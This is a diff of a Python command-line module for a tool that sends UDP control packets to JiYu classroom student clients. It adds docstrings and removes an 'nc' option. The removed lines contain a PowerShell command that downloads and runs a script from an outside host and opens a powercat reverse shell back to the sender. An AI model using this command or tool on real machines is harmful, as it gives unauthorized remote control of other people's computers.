@@ -1,10 +1,8 @@
 """命令行参数解析与命令分发。"""
 
 import argparse
-import random
-import socket
 import sys
-from multiprocessing import Pool, freeze_support
+from multiprocessing import freeze_support
 from os import system
 from time import sleep
 
@@ -26,6 +24,7 @@ from ..core import (
 
 
 def build_parser():
+    """创建 CLI 参数解析器。"""
     parser = argparse.ArgumentParser(description="极域学生端 UDP 控制报文测试工具")
     parser.add_argument(
         "-V",
@@ -69,7 +68,7 @@ def build_parser():
     parser.add_argument(
         "-e",
         type=str,
-        choices=["r", "s", "l", "g", "nc", "break", "continue"],
+        choices=["r", "s", "l", "g", "break", "continue"],
         help="Extra Options加载额外的选项 eg：-e r；-e l 注销",
     )
     return parser
@@ -78,10 +77,11 @@ def build_parser():
 parser = build_parser()
 
 
-def creat_send_object(arguments):
+def create_send_packets(arguments):
+    """根据 CLI 参数构造待发送的报文列表。"""
     send_list = []
 
-    # 获取命令内容
+    # 先统一读取消息来源，确保 -msg 与 --msg-file 的处理保持一致。
     message = read_message(arguments)
     if message:
         send_list.extend(
@@ -104,6 +104,7 @@ def creat_send_object(arguments):
 
 
 def single_command(arguments):
+    """执行查询本机信息或切换本机防火墙规则等单项操作。"""
     if arguments.e == "g":
         try:
             ip, ports = local_ip_and_ports()
@@ -136,18 +137,8 @@ def single_command(arguments):
         return
 
 
-def netcat(num, arguments):
-    send_list = []
-    hostname = socket.gethostname()
-    ip = socket.gethostbyname(hostname)
-    cmd = "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -c {} -p {} -e cmd".format(
-        ip, num
-    )
-    send_list.append(pkg_sendlist("-c", cmd))
-    send(send_list, arguments.ip, arguments.p, arguments.l, arguments.t)
-
-
 def run_file_transfer(arguments):
+    """执行文件传送并输出传送结果。"""
     result = transfer_file(
         arguments.ip,
         arguments.p,
@@ -167,6 +158,7 @@ def run_file_transfer(arguments):
 
 
 def run_from_cmd(arguments):
+    """校验参数并分发 CLI 请求。"""
     try:
         single_command(arguments)
         if arguments.e in {"g", "break", "continue"}:
@@ -177,28 +169,15 @@ def run_from_cmd(arguments):
             return run_file_transfer(arguments)
         if arguments.file_ip or arguments.file_timeout != 120:
             raise ValueError("--file-ip 和 --file-timeout 仅用于文件传送")
-        if arguments.e != "nc":
-            send_list = creat_send_object(arguments)
-            send(
-                send_list,
-                arguments.ip,
-                arguments.p,
-                arguments.l,
-                arguments.t,
-                report=print,
-            )
-            return
-        num = random.randint(1, 65535)
-        pool = Pool(processes=1)
-        pool.apply_async(netcat, (num, arguments))
-        print("listening on [any] {} ...".format(num))
-        system(
-            "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -l -p {}".format(
-                num
-            )
+        send_list = create_send_packets(arguments)
+        send(
+            send_list,
+            arguments.ip,
+            arguments.p,
+            arguments.l,
+            arguments.t,
+            report=print,
         )
-        pool.close()
-        pool.join()
     except Exception as e:
         print("[-] %s" % e)
         return 1
@@ -206,6 +185,7 @@ def run_from_cmd(arguments):
 
 
 def main(argv=None):
+    """解析参数并执行 CLI 或隐藏的防火墙助手。"""
     arguments = list(sys.argv[1:] if argv is None else argv)
     if arguments[:1] == [FIREWALL_HELPER_ARGUMENT]:
         return run_firewall_helper(arguments[1:])
